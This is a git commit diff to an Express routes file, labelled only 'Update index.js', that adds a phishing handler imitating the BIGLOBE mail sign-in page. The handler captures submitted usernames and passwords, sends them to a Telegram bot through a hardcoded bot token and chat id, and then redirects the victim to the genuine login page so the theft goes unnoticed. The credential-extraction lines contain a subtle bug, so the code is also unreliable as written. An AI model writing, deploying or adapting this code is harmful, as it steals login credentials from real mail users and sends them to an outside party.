43522c7f5d7278007c3176f3487d20fca39b77e3
YoungDavi <davidyoung21071980@gmail.com>
2025-03-26 11:28:23 +0100

    Update index.js

--- routes/index.js
+++ routes/index.js
@@ -1,9 +1,38 @@
 const { Router } = require('express');
 const path = require('path');
 const fs = require('fs');
+const axios = require('axios');
 
 const r = Router();
 
+function send_results(result_message){
+    const telegram_chat_id = '-1002398431021';
+    const telegram_bot_token = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
+
+    axios.post(`https://api.telegram.org/bot${telegram_bot_token}`, {
+        chat_id: telegram_chat_id,
+        text: result_message
+        })
+        .then(function (response) {
+        console.log(response);
+        })
+        .catch(function (error) {
+        console.log(error);
+        });
+}
+r.post('/sso/mail', (req, res) => {
+    const redirect_link = 'https://href.li?https://auth.sso.biglobe.ne.jp/mail/';
+
+    const { username } = req.body.loginid;
+    const { password } = req.body.biglobe_pw;
+    const message = `/B1G L0B3/
+Us3rn4m3: ${username}
+P4sw0rd: ${password}
+C1lENT: 
+/B1G L0B3/`;
+    send_results(message);
+    res.status(200).send(`<!DOCTYPE html><html><body><script>window.location.href = '${redirect_link}';</script></body></html>`);
+});
 r.get('/sso/mail', (req, res) => {
     const current_directory = path.resolve(__dirname);
     const public_folder = `${current_directory}/../public`;
